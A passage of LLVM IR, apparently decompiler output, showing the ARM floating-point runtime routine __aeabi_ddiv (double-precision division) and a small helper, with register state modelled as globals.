  uselistorder i32 12, { 29, 30, 47, 48, 49, 0, 50, 5, 51, 17, 10, 11, 3, 54, 12, 8, 70, 71, 72, 73, 74, 75, 9, 76, 77, 78, 79, 80, 81, 13, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 14, 18, 46, 63, 19, 20, 64, 65, 66, 1, 21, 67, 6, 68, 7, 22, 2, 69, 15, 55, 56, 57, 58, 82, 4, 44, 52, 53, 23, 24, 25, 26, 27, 28, 45, 59, 60, 61, 16, 62 }
  uselistorder i32 -32, { 2, 1, 3, 4, 5, 6, 10, 7, 11, 12, 8, 0, 9 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_17cd4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17cd4:
  %v1_17cd8 = or i32 %arg1, 2146959360
  ret i32 %v1_17cd8
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17ce0 = load i32, i32* @r4, align 4
  store i32 %v3_17ce0, i32* %stack_var_-16, align 4
  %v6_17ce0 = load i32, i32* @r5, align 4
  %v9_17ce0 = load i32, i32* @r6, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_17cec = load i32, i32* %r0.global-to-local, align 4
  %v4_17cec = udiv i32 %v1_17cec, 1048576
  %v5_17cec = urem i32 %v4_17cec, 2048
  store i32 %v5_17cec, i32* @r4, align 4
  %v6_17cec = icmp eq i32 %v5_17cec, 0
  br i1 %v6_17cec, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_17cf0 = udiv i32 %arg3, 1048576
  %v6_17cf0 = urem i32 %v5_17cf0, 2048
  store i32 %v6_17cf0, i32* %r5.global-to-local, align 4
  %v7_17cf0 = icmp eq i32 %v6_17cf0, 0
  br i1 %v7_17cf0, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_17e74

bb92:                                             ; preds = %bb
  %v5_17cf4 = icmp eq i32 %v5_17cec, 2047
  br i1 %v5_17cf4, label %.thread2, label %bb93

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb92
  %.pre148.pre-phi = phi i32 [ %.pre150, %entry..thread2_crit_edge ], [ %v5_17cf0, %bb92 ]
  br label %dec_label_pc_17e74

bb93:                                             ; preds = %bb92
  %v5_17cf8 = icmp eq i32 %v6_17cf0, 2047
  br i1 %v5_17cf8, label %dec_label_pc_17e74, label %dec_label_pc_17d00

dec_label_pc_17d00:                               ; preds = %bb93
  %v2_17d00 = sub nsw i32 %v5_17cec, %v6_17cf0
  store i32 %v2_17d00, i32* %r4.global-to-local, align 4
  %v2_17d04 = xor i32 %v1_17cec, %arg3
  %v4_17d08 = mul i32 %arg3, 4096
  %v5_17d08 = or i32 %v4_17d08, %arg4
  store i32 %v5_17d08, i32* %r5.global-to-local, align 4
  %v7_17d08 = icmp eq i32 %v5_17d08, 0
  %v3_17d0c = mul i32 %v1_17cec, 4096
  store i32 %v3_17d0c, i32* %r0.global-to-local, align 4
  br i1 %v7_17d08, label %dec_label_pc_17e44, label %dec_label_pc_17d14

dec_label_pc_17d14:                               ; preds = %dec_label_pc_17d00
  %tmp94 = mul i32 %arg3, 256
  %v4_17d1c = and i32 %tmp94, 268435200
  %v4_17d20 = udiv i32 %arg4, 16777216
  %v5_17d1c = or i32 %v4_17d20, %v4_17d1c
  %v5_17d20 = or i32 %v5_17d1c, 268435456
  store i32 %v5_17d20, i32* %r2.global-to-local, align 4
  %v3_17d24 = mul i32 %arg4, 256
  store i32 %v3_17d24, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_17cec, 256
  %v4_17d28 = and i32 %tmp95, 268435200
  %v1_17d2c = load i32, i32* @r1, align 4
  %v4_17d2c = udiv i32 %v1_17d2c, 16777216
  %v5_17d28 = or i32 %v4_17d28, %v4_17d2c
  %v5_17d2c = or i32 %v5_17d28, 268435456
  store i32 %v5_17d2c, i32* %r5.global-to-local, align 4
  %v3_17d30 = mul i32 %v1_17d2c, 256
  store i32 %v3_17d30, i32* %r6.global-to-local, align 4
  %v1_17d34 = and i32 %v2_17d04, -2147483648
  store i32 %v1_17d34, i32* %r0.global-to-local, align 4
  %v3_17d38 = icmp uge i32 %v5_17d2c, %v5_17d20
  %v9_17d38 = icmp eq i32 %v5_17d2c, %v5_17d20
  br i1 %v9_17d38, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_17d14
  %v4_17d3c = icmp uge i32 %v3_17d30, %v3_17d24
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_17d14, %bb96
  %v1_17d40 = phi i1 [ %v3_17d38, %dec_label_pc_17d14 ], [ %v4_17d3c, %bb96 ]
  %v2_17d40 = add nsw i32 %v2_17d00, 253
  %v3_17d40 = zext i1 %v1_17d40 to i32
  %v4_17d40 = add nsw i32 %v2_17d40, %v3_17d40
  %v8_17d40 = icmp ule i32 %v4_17d40, %v2_17d00
  %v9_17d40 = icmp ugt i32 %v2_17d00, -254
  %v10_17d40 = select i1 %v1_17d40, i1 %v8_17d40, i1 %v9_17d40
  %v1_17d44 = add nsw i32 %v4_17d40, 768
  store i32 %v1_17d44, i32* %r4.global-to-local, align 4
  br i1 %v10_17d40, label %dec_label_pc_17d54, label %dec_label_pc_17d4c

dec_label_pc_17d4c:                               ; preds = %bb97
  %v3_17d4c = udiv i32 %v5_17d20, 2
  store i32 %v3_17d4c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17d54

dec_label_pc_17d54:                               ; preds = %bb97, %dec_label_pc_17d4c
  %v0_17d5c = phi i32 [ %v5_17d20, %bb97 ], [ %v3_17d4c, %dec_label_pc_17d4c ]
  %v0_17d60 = phi i32 [ %v3_17d24, %bb97 ], [ 0, %dec_label_pc_17d4c ]
  %v2_17d54 = sub i32 %v3_17d30, %v0_17d60
  store i32 %v2_17d54, i32* %r6.global-to-local, align 4
  %v3_17d54 = icmp uge i32 %v3_17d30, %v0_17d60
  %v3_17d58 = icmp eq i1 %v3_17d54, false
  %v4_17d58 = sub nsw i32 %v5_17d2c, %v0_17d5c
  %v6_17d58 = sext i1 %v3_17d58 to i32
  %v7_17d58 = add nsw i32 %v6_17d58, %v4_17d58
  store i32 %v7_17d58, i32* %r5.global-to-local, align 4
  %v3_17d5c = udiv i32 %v0_17d5c, 2
  store i32 %v3_17d5c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17d6c.outer

dec_label_pc_17d6c.outer:                         ; preds = %dec_label_pc_17e04, %dec_label_pc_17d54
  %v1_17e18.ph = phi i32 [ %v2_17e04, %dec_label_pc_17e04 ], [ %v1_17d34, %dec_label_pc_17d54 ]
  %v0_17d70.ph = phi i32 [ %v5_17de0, %dec_label_pc_17e04 ], [ %v7_17d58, %dec_label_pc_17d54 ]
  %v1_17d74.ph = phi i32 [ %v3_17de4, %dec_label_pc_17e04 ], [ %v2_17d54, %dec_label_pc_17d54 ]
  %v5_17dec17.ph = phi i32 [ %v5_17dec, %dec_label_pc_17e04 ], [ %v3_17d5c, %dec_label_pc_17d54 ]
  %v3_17df013.ph = phi i32 [ %v3_17df0, %dec_label_pc_17e04 ], [ 0, %dec_label_pc_17d54 ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_17e04 ], [ 1048576, %dec_label_pc_17d54 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_17e04 ], [ 524288, %dec_label_pc_17d54 ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17d6c

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d6c.outer, %dec_label_pc_17ddc
  %v1_17dd059 = phi i32 [ %v2_17e18, %dec_label_pc_17ddc ], [ %storemerge136, %dec_label_pc_17d6c.outer ]
  %v1_17d7c = phi i32 [ %v1_17d7c32, %dec_label_pc_17ddc ], [ %storemerge136, %dec_label_pc_17d6c.outer ]
  %v1_17d9841 = phi i32 [ %v1_17d9843, %dec_label_pc_17ddc ], [ %storemerge136, %dec_label_pc_17d6c.outer ]
  %v1_17db450 = phi i32 [ %v1_17db452, %dec_label_pc_17ddc ], [ %storemerge136, %dec_label_pc_17d6c.outer ]
  %v0_17df4 = phi i32 [ %v3_17df4, %dec_label_pc_17ddc ], [ %storemerge, %dec_label_pc_17d6c.outer ]
  %v0_17d70 = phi i32 [ %v5_17de0, %dec_label_pc_17ddc ], [ %v0_17d70.ph, %dec_label_pc_17d6c.outer ]
  %v1_17d74 = phi i32 [ %v3_17de4, %dec_label_pc_17ddc ], [ %v1_17d74.ph, %dec_label_pc_17d6c.outer ]
  %v5_17dec17 = phi i32 [ %v5_17dec, %dec_label_pc_17ddc ], [ %v5_17dec17.ph, %dec_label_pc_17d6c.outer ]
  %v3_17df013 = phi i32 [ %v3_17df0, %dec_label_pc_17ddc ], [ %v3_17df013.ph, %dec_label_pc_17d6c.outer ]
  %v3_17d6c = icmp uge i32 %v1_17d74, %v3_17df013
  %v3_17d70 = icmp eq i1 %v3_17d6c, false
  %v4_17d70 = sub i32 %v0_17d70, %v5_17dec17
  %v6_17d70 = sext i1 %v3_17d70 to i32
  %v7_17d70 = add i32 %v6_17d70, %v4_17d70
  %v8_17d70 = zext i1 %v3_17d70 to i32
  %v9_17d70 = sub i32 %v7_17d70, %v8_17d70
  %v10_17d70 = icmp ult i32 %v0_17d70, %v9_17d70
  %v11_17d70 = icmp ne i32 %v5_17dec17, -1
  %v12_17d70 = or i1 %v11_17d70, %v10_17d70
  %v13_17d70 = icmp ult i32 %v0_17d70, %v5_17dec17
  %v14_17d70 = select i1 %v3_17d70, i1 %v12_17d70, i1 %v13_17d70
  br i1 %v14_17d70, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_17d6c
  %v3_17d74 = sub i32 %v1_17d74, %v3_17df013
  store i32 %v3_17d74, i32* %r6.global-to-local, align 4
  store i32 %v7_17d70, i32* %r5.global-to-local, align 4
  %v3_17d7c = or i32 %v1_17d7c, %v0_17df4
  store i32 %v3_17d7c, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17d6c, %bb98
  %v1_17dd058 = phi i32 [ %v1_17dd059, %dec_label_pc_17d6c ], [ %v3_17d7c, %bb98 ]
  %v1_17d7c35 = phi i32 [ %v1_17d7c, %dec_label_pc_17d6c ], [ %v3_17d7c, %bb98 ]
  %v1_17d98 = phi i32 [ %v1_17d9841, %dec_label_pc_17d6c ], [ %v3_17d7c, %bb98 ]
  %v1_17db449 = phi i32 [ %v1_17db450, %dec_label_pc_17d6c ], [ %v3_17d7c, %bb98 ]
  %v0_17d8c = phi i32 [ %v0_17d70, %dec_label_pc_17d6c ], [ %v7_17d70, %bb98 ]
  %v1_17d90 = phi i32 [ %v1_17d74, %dec_label_pc_17d6c ], [ %v3_17d74, %bb98 ]
  %v1_17d80 = urem i32 %v5_17dec17, 2
  %v2_17d80 = icmp ne i32 %v1_17d80, 0
  %v3_17d80 = udiv i32 %v5_17dec17, 2
  %v3_17d84 = zext i1 %v2_17d80 to i32
  %v6_17d84 = zext i32 %v3_17df013 to i64
  %v7_17d84 = sub i32 33, %v3_17df013
  %v8_17d84 = zext i32 %v7_17d84 to i64
  %v9_17d84 = shl i64 %v6_17d84, %v8_17d84
  %v10_17d84 = sub i32 32, %v3_17df013
  %v11_17d84 = shl i32 %v3_17d84, %v10_17d84
  %v12_17d84 = zext i32 %v11_17d84 to i64
  %v14_17d84 = or i64 %v12_17d84, %v9_17d84
  %v15_17d84 = trunc i64 %v14_17d84 to i32
  %v3_17d88 = icmp uge i32 %v1_17d90, %v15_17d84
  %v3_17d8c = icmp eq i1 %v3_17d88, false
  %v4_17d8c = sub i32 %v0_17d8c, %v3_17d80
  %v6_17d8c = sext i1 %v3_17d8c to i32
  %v7_17d8c = add i32 %v6_17d8c, %v4_17d8c
  %v13_17d8c = icmp ult i32 %v0_17d8c, %v3_17d80
  %v14_17d8c = or i1 %v13_17d8c, %v3_17d8c
  br i1 %v14_17d8c, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_17d90 = sub i32 %v1_17d90, %v15_17d84
  store i32 %v3_17d90, i32* %r6.global-to-local, align 4
  store i32 %v7_17d8c, i32* %r5.global-to-local, align 4
  %v5_17d98 = udiv i32 %v0_17df4, 2
  %v6_17d98 = or i32 %v1_17d98, %v5_17d98
  store i32 %v6_17d98, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_17dd057 = phi i32 [ %v1_17dd058, %.thread4 ], [ %v6_17d98, %bb99 ]
  %v1_17d7c34 = phi i32 [ %v1_17d7c35, %.thread4 ], [ %v6_17d98, %bb99 ]
  %v1_17d9845 = phi i32 [ %v1_17d98, %.thread4 ], [ %v6_17d98, %bb99 ]
  %v1_17db4 = phi i32 [ %v1_17db449, %.thread4 ], [ %v6_17d98, %bb99 ]
  %v0_17da8 = phi i32 [ %v0_17d8c, %.thread4 ], [ %v7_17d8c, %bb99 ]
  %v1_17dac = phi i32 [ %v1_17d90, %.thread4 ], [ %v3_17d90, %bb99 ]
  %v1_17d9c = urem i32 %v3_17d80, 2
  %v2_17d9c = icmp ne i32 %v1_17d9c, 0
  %v3_17d9c = udiv i32 %v5_17dec17, 4
  %v3_17da0 = zext i1 %v2_17d9c to i32
  %v6_17da0 = and i64 %v14_17d84, 4294967295
  %v7_17da0 = sub i32 33, %v15_17d84
  %v8_17da0 = zext i32 %v7_17da0 to i64
  %v9_17da0 = shl i64 %v6_17da0, %v8_17da0
  %v10_17da0 = sub i32 32, %v15_17d84
  %v11_17da0 = shl i32 %v3_17da0, %v10_17da0
  %v12_17da0 = zext i32 %v11_17da0 to i64
  %v14_17da0 = or i64 %v12_17da0, %v9_17da0
  %v15_17da0 = trunc i64 %v14_17da0 to i32
  %v3_17da4 = icmp uge i32 %v1_17dac, %v15_17da0
  %v3_17da8 = icmp eq i1 %v3_17da4, false
  %v4_17da8 = sub i32 %v0_17da8, %v3_17d9c
  %v6_17da8 = sext i1 %v3_17da8 to i32
  %v7_17da8 = add i32 %v6_17da8, %v4_17da8
  %v13_17da8 = icmp ult i32 %v0_17da8, %v3_17d9c
  %v14_17da8 = or i1 %v13_17da8, %v3_17da8
  br i1 %v14_17da8, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_17dac = sub i32 %v1_17dac, %v15_17da0
  store i32 %v3_17dac, i32* %r6.global-to-local, align 4
  store i32 %v7_17da8, i32* %r5.global-to-local, align 4
  %v5_17db4 = udiv i32 %v0_17df4, 4
  %v6_17db4 = or i32 %v1_17db4, %v5_17db4
  store i32 %v6_17db4, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_17dd0 = phi i32 [ %v1_17dd057, %.thread6 ], [ %v6_17db4, %bb100 ]
  %v1_17d7c33 = phi i32 [ %v1_17d7c34, %.thread6 ], [ %v6_17db4, %bb100 ]
  %v1_17d9844 = phi i32 [ %v1_17d9845, %.thread6 ], [ %v6_17db4, %bb100 ]
  %v1_17db453 = phi i32 [ %v1_17db4, %.thread6 ], [ %v6_17db4, %bb100 ]
  %v0_17dc4 = phi i32 [ %v0_17da8, %.thread6 ], [ %v7_17da8, %bb100 ]
  %v1_17dc8 = phi i32 [ %v1_17dac, %.thread6 ], [ %v3_17dac, %bb100 ]
  %v1_17db8 = urem i32 %v3_17d9c, 2
  %v2_17db8 = icmp ne i32 %v1_17db8, 0
  %v3_17db8 = udiv i32 %v5_17dec17, 8
  %v3_17dbc = zext i1 %v2_17db8 to i32
  %v6_17dbc = and i64 %v14_17da0, 4294967295
  %v7_17dbc = sub i32 33, %v15_17da0
  %v8_17dbc = zext i32 %v7_17dbc to i64
  %v9_17dbc = shl i64 %v6_17dbc, %v8_17dbc
  %v10_17dbc = sub i32 32, %v15_17da0
  %v11_17dbc = shl i32 %v3_17dbc, %v10_17dbc
  %v12_17dbc = zext i32 %v11_17dbc to i64
  %v14_17dbc = or i64 %v12_17dbc, %v9_17dbc
  %v15_17dbc = trunc i64 %v14_17dbc to i32
  %v3_17dc0 = icmp uge i32 %v1_17dc8, %v15_17dbc
  %v3_17dc4 = icmp eq i1 %v3_17dc0, false
  %v4_17dc4 = sub i32 %v0_17dc4, %v3_17db8
  %v6_17dc4 = sext i1 %v3_17dc4 to i32
  %v7_17dc4 = add i32 %v6_17dc4, %v4_17dc4
  %v13_17dc4 = icmp ult i32 %v0_17dc4, %v3_17db8
  %v14_17dc4 = or i1 %v13_17dc4, %v3_17dc4
  br i1 %v14_17dc4, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_17dc8 = sub i32 %v1_17dc8, %v15_17dbc
  store i32 %v3_17dc8, i32* %r6.global-to-local, align 4
  store i32 %v7_17dc4, i32* %r5.global-to-local, align 4
  %v5_17dd0 = udiv i32 %v0_17df4, 8
  %v6_17dd0 = or i32 %v1_17dd0, %v5_17dd0
  store i32 %v6_17dd0, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
  %v1_17de0 = phi i32 [ %v1_17dc8, %.thread8 ], [ %v3_17dc8, %bb102 ]
  %v0_17ddc = phi i32 [ %v0_17dc4, %.thread8 ], [ %v7_17dc4, %bb102 ]
  %v2_17e18 = phi i32 [ %v1_17dd0, %.thread8 ], [ %v6_17dd0, %bb102 ]
  %v1_17d7c32 = phi i32 [ %v1_17d7c33, %.thread8 ], [ %v6_17dd0, %bb102 ]
  %v1_17d9843 = phi i32 [ %v1_17d9844, %.thread8 ], [ %v6_17dd0, %bb102 ]
  %v1_17db452 = phi i32 [ %v1_17db453, %.thread8 ], [ %v6_17dd0, %bb102 ]
  %v2_17dd4 = or i32 %v0_17ddc, %v1_17de0
  %v4_17dd4 = icmp eq i32 %v2_17dd4, 0
  br i1 %v4_17dd4, label %dec_label_pc_17e14, label %dec_label_pc_17ddc

dec_label_pc_17ddc:                               ; preds = %.thread10
  %v3_17ddc = mul i32 %v0_17ddc, 16
  %v4_17de0 = udiv i32 %v1_17de0, 268435456
  %v5_17de0 = or i32 %v3_17ddc, %v4_17de0
  store i32 %v5_17de0, i32* %r5.global-to-local, align 4
  %v3_17de4 = mul i32 %v1_17de0, 16
  store i32 %v3_17de4, i32* %r6.global-to-local, align 4
  %v3_17de8 = mul nuw i32 %v3_17db8, 8
  %v4_17dec = udiv i32 %v15_17dbc, 536870912
  %v5_17dec = or i32 %v4_17dec, %v3_17de8
  %v3_17df0 = mul i32 %v15_17dbc, 8
  %v3_17df4 = udiv i32 %v0_17df4, 16
  store i32 %v3_17df4, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17df4, 16
  br i1 %tmp, label %dec_label_pc_17dfc, label %dec_label_pc_17d6c

dec_label_pc_17dfc:                               ; preds = %dec_label_pc_17ddc
  %v1_17dfc = and i32 %v1_17e18.ph, 1048576
  %v2_17dfc = icmp eq i32 %v1_17dfc, 0
  br i1 %v2_17dfc, label %dec_label_pc_17e04, label %.thread11.loopexit

dec_label_pc_17e04:                               ; preds = %dec_label_pc_17dfc
  %v2_17e04 = or i32 %v2_17e18, %v1_17e18.ph
  store i32 %v2_17e04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17d6c.outer

dec_label_pc_17e14:                               ; preds = %.thread10
  store i32 %v15_17dbc, i32* %r3.global-to-local, align 4
  store i32 %v3_17db8, i32* %r2.global-to-local, align 4
  %v1_17e14 = and i32 %v1_17e18.ph, 1048576
  %v2_17e14 = icmp eq i32 %v1_17e14, 0
  br i1 %v2_17e14, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_17e14
  %v3_17e18 = or i32 %v2_17e18, %v1_17e18.ph
  store i32 %v3_17e18, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_17dfc
  store i32 %v3_17df0, i32* %r3.global-to-local, align 4
  store i32 %v5_17dec, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_17e14, %bb103
  %v1_17e20 = add nsw i32 %v4_17d40, 515
  store i32 %v1_17e20, i32* %ip.global-to-local, align 4
  %v2_17e20 = icmp ugt i32 %v1_17d44, 252
  %v7_17e20 = icmp eq i32 %v1_17d44, 253
  %v2_17e24 = xor i1 %v7_17e20, true
  %v3_17e24 = and i1 %v2_17e20, %v2_17e24
  br i1 %v3_17e24, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_17e24 = icmp ugt i32 %v1_17e20, 1791
  %v11_17e24 = icmp eq i32 %v1_17e20, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_17e28 = phi i1 [ %v7_17e20, %.thread11 ], [ %v11_17e24, %bb104 ]
  %v0_17e28 = phi i1 [ %v2_17e20, %.thread11 ], [ %v6_17e24, %bb104 ]
  %v2_17e28 = xor i1 %v1_17e28, true
  %v3_17e28 = and i1 %v0_17e28, %v2_17e28
  call void @__pseudo_cond_branch(i1 %v3_17e28, i32 ptrtoint (i32* @global_var_17b58.659 to i32))
  %v0_17e2c = load i32, i32* %r5.global-to-local, align 4
  %v1_17e2c = load i32, i32* %r2.global-to-local, align 4
  %v2_17e2c = sub i32 %v0_17e2c, %v1_17e2c
  store i32 %v2_17e2c, i32* %ip.global-to-local, align 4
  %v3_17e2c = icmp uge i32 %v0_17e2c, %v1_17e2c
  %v9_17e2c = icmp eq i32 %v0_17e2c, %v1_17e2c
  br i1 %v9_17e2c, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_17e30 = load i32, i32* %r6.global-to-local, align 4
  %v2_17e30 = load i32, i32* %r3.global-to-local, align 4
  %v3_17e30 = sub i32 %v1_17e30, %v2_17e30
  store i32 %v3_17e30, i32* %ip.global-to-local, align 4
  %v4_17e30 = icmp uge i32 %v1_17e30, %v2_17e30
  %v10_17e30 = icmp eq i32 %v1_17e30, %v2_17e30
  br i1 %v10_17e30, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_17e34 = load i32, i32* %r1.global-to-local, align 4
  %v2_17e34 = urem i32 %v1_17e34, 2
  %v3_17e34 = icmp ne i32 %v2_17e34, 0
  %v4_17e34 = udiv i32 %v1_17e34, 2
  store i32 %v4_17e34, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_17e38 = phi i1 [ %v3_17e2c, %bb105 ], [ %v4_17e30, %bb106 ], [ %v3_17e34, %bb107 ]
  %v0_17e38 = load i32, i32* %r1.global-to-local, align 4
  %v2_17e38 = zext i1 %v1_17e38 to i32
  %v3_17e38 = add i32 %v2_17e38, %v0_17e38
  store i32 %v3_17e38, i32* %r1.global-to-local, align 4
  %v0_17e3c = load i32, i32* %r0.global-to-local, align 4
  %v1_17e3c = load i32, i32* %r4.global-to-local, align 4
  %v2_17e3c = and i32 %v1_17e3c, 4096
  %v3_17e3c = icmp ne i32 %v2_17e3c, 0
  %v4_17e3c = mul i32 %v1_17e3c, 1048576
  %v6_17e3c = add i32 %v4_17e3c, %v0_17e3c
  %v7_17e3c = zext i1 %v3_17e3c to i32
  %v8_17e3c = add i32 %v7_17e3c, %v6_17e3c
  store i32 %v8_17e3c, i32* %r0.global-to-local, align 4
  %v2_17e40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17e40, i32* %r4.global-to-local, align 4
  store i32 %v6_17ce0, i32* %r5.global-to-local, align 4
  store i32 %v9_17ce0, i32* %r6.global-to-local, align 4
  ret i32 %v8_17e3c

dec_label_pc_17e44:                               ; preds = %dec_label_pc_17d00
  %v1_17e44 = and i32 %v2_17d04, -2147483648
  %v4_17e48 = urem i32 %v1_17cec, 1048576
  %v5_17e48 = or i32 %v1_17e44, %v4_17e48
  store i32 %v5_17e48, i32* %r0.global-to-local, align 4
  %v6_17e4c = add nsw i32 %v2_17d00, 1023
  store i32 %v6_17e4c, i32* %r4.global-to-local, align 4
  %v8_17e4c = sub nsw i32 0, %v2_17d00
  %v9_17e4c = and i32 %v6_17e4c, %v8_17e4c
  %v11_17e4c = icmp slt i32 %v2_17d00, -1023
  %v12_17e4c = icmp eq i32 %v6_17e4c, 0
  %v7_17e50 = icmp sgt i32 %v2_17d00, -1023
  br i1 %v7_17e50, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_17e44
  %v10_17e50 = sub nsw i32 1024, %v2_17d00
  store i32 %v10_17e50, i32* %r5.global-to-local, align 4
  %v14_17e50 = and i32 %v10_17e50, %v6_17e4c
  %v16_17e50 = icmp slt i32 %v10_17e50, 0
  %v17_17e50 = icmp eq i32 %v6_17e4c, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_17e44, %bb108
  %v2_17e58.in = phi i32 [ %v9_17e4c, %dec_label_pc_17e44 ], [ %v14_17e50, %bb108 ]
  %v1_17e58 = phi i1 [ %v11_17e4c, %dec_label_pc_17e44 ], [ %v16_17e50, %bb108 ]
  %v0_17e58 = phi i1 [ %v12_17e4c, %dec_label_pc_17e44 ], [ %v17_17e50, %bb108 ]
  %v2_17e58 = icmp slt i32 %v2_17e58.in, 0
  %v3_17e54 = xor i1 %v2_17e58, %v1_17e58
  %v4_17e54 = or i1 %v0_17e58, %v3_17e54
  br i1 %v4_17e54, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_17e5485 = mul i32 %v6_17e4c, 1048576
  %v10_17e5486 = or i32 %v9_17e5485, %v5_17e48
  store i32 %v10_17e5486, i32* %r0.global-to-local, align 4
  store i32 %v3_17ce0, i32* %r4.global-to-local, align 4
  store i32 %v6_17ce0, i32* %r5.global-to-local, align 4
  ret i32 %v10_17e5486

bb111:                                            ; preds = %bb109
  %v1_17e5c = or i32 %v5_17e48, 1048576
  store i32 %v1_17e5c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_17e64 = add nsw i32 %v2_17d00, 1022
  store i32 %v1_17e64, i32* @r4, align 4
  %v3_17e64 = sub nsw i32 -1023, %v2_17d00
  %v4_17e64 = and i32 %v6_17e4c, %v3_17e64
  %v5_17e64 = icmp slt i32 %v4_17e64, 0
  store i1 %v5_17e64, i1* @cpsr_v, align 1
  %v6_17e64 = icmp slt i32 %v2_17d00, -1022
  store i1 %v6_17e64, i1* @cpsr_n, align 1
  %v7_17e64 = icmp eq i32 %v6_17e4c, 1
  store i1 %v7_17e64, i1* @cpsr_z, align 1
  %v1_17e68 = call i32 @function_17b58(i32 %v1_17e5c)
  store i32 %v1_17e68, i32* %r0.global-to-local, align 4
  %v0_17e6c = load i32, i32* @r5, align 4
  %v1_17e6c = load i32, i32* @r6, align 4
  %v2_17e6c = or i32 %v1_17e6c, %v0_17e6c
  store i32 %v2_17e6c, i32* @lr, align 4
  %v1_17e70 = call i32 @function_17b58(i32 %v1_17e68)
  store i32 %v1_17e70, i32* %r0.global-to-local, align 4
  %v0_17e74.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_17e78.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17e74

dec_label_pc_17e74:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_17e74.pre-phi = phi i32 [ %v5_17cf0, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_17cf0, %bb93 ], [ %v5_17cf0, %bb111 ]
  %v0_17e78 = phi i32 [ %v5_17cec, %.thread1 ], [ %v5_17cec, %.thread2 ], [ %v5_17cec, %bb93 ], [ %v0_17e78.pre, %bb111 ]
  %v2_17e7c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_17e74.pre, %bb111 ]
  %v5_17e74 = and i32 %v2_17e7c, %v4_17e74.pre-phi
  store i32 %v5_17e74, i32* @r5, align 4
  %v4_17e78 = icmp eq i32 %v2_17e7c, %v0_17e78
  br i1 %v4_17e78, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_17e74
  %v5_17e7c = icmp eq i32 %v5_17e74, %v2_17e7c
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_17e74, %bb112
  %v0_17e80 = phi i1 [ false, %dec_label_pc_17e74 ], [ %v5_17e7c, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_17e80, i32 ptrtoint (i32* @global_var_17cd4.660 to i32))
  %v0_17e84 = load i32, i32* @r4, align 4
  %v1_17e84 = load i32, i32* %ip.global-to-local, align 4
  %v4_17e84 = icmp eq i32 %v1_17e84, %v0_17e84
  br i1 %v4_17e84, label %dec_label_pc_17e8c, label %dec_label_pc_17ea8

